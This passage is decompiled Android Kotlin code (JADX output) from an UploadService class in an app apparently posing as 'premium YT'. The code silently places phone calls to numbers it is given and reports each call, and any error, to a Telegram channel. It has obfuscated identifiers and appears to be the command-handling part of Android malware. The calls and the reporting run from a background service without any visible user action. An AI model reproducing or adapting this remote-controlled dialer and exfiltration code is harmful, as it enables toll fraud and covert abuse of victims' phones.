                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۹۷۱String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch$if$funmakeCallAndNotify$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    private final void makeCallAndNotify(String number) {
        if (ContextCompat.checkSelfPermission(this, "android.permission.CALL_PHONE") != 0) {
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۰۵1(null), 3, (Object) null);
            return;
        }
        try {
            Intent intent = new Intent("android.intent.action.CALL");
            intent.setData(Uri.parse(LiveLiterals$UploadServiceKt.INSTANCE.m۵۰۸String$0$str$arg0$callparse$arg0$callsetData$try$funmakeCallAndNotify$classUploadService() + number));
            intent.addFlags(268435456);
            startActivity(intent);
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۰۶2(number, null), 3, (Object) null);
        } catch (Exception e) {
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass3(e, null), 3, (Object) null);
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$makeCallAndNotify$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$makeCallAndNotify$2", f = "UploadService.kt", i = {}, l = {3066}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۰۶2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $number;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۰۶2(String str, Continuation<? super C۰۰۰۶2> continuation) {
            super(2, continuation);
            this.$number = str;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۰۶2(this.$number, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۳۶String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$try$funmakeCallAndNotify$classUploadService() + this.$number + LiveLiterals$UploadServiceKt.INSTANCE.m۶۶۱String$2$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$try$funmakeCallAndNotify$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$makeCallAndNotify$3, reason: invalid class name */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$makeCallAndNotify$3", f = "UploadService.kt", i = {}, l = {3068}, m = "invokeSuspend", n = {}, s = {})
    static final class AnonymousClass3 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ Exception $e;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        AnonymousClass3(Exception exc, Continuation<? super AnonymousClass3> continuation) {
            super(2, continuation);
            this.$e = exc;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new AnonymousClass3(this.$e, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۲۵String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$catch$funmakeCallAndNotify$classUploadService() + this.$e.getMessage(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }
}